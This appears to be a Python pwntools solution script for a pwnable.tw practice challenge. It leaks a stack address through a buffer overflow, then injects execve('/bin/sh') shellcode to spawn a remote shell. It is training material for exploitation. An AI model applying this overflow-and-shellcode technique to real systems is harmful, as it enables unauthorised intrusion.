from pwn import *

server = remote('chall.pwnable.tw', 10000)

print(server.read())

payload = 'a'*20
payload += pack(0x08048087, 32)
server.send(payload)
stack_addr = unpack(server.read()[:4])

shellcode = 'a'*20
shellcode += p32(stack_addr+20) 
shellcode += asm('xor eax, eax')
shellcode += asm('add eax, 0xb')
shellcode += asm('xor ecx, ecx')
shellcode += asm('xor edx, edx')
shellcode += asm('xor esi, esi')
shellcode += asm('push 0x'+'/sh\x00'[::-1].encode('hex'))
shellcode += asm('push 0x'+'/bin'[::-1].encode('hex'))
shellcode += asm('mov ebx, esp')
shellcode += asm('int 0x80')
shellcode += asm('push 0x08048090')
shellcode += asm('ret')


server.send(shellcode)
server.interactive()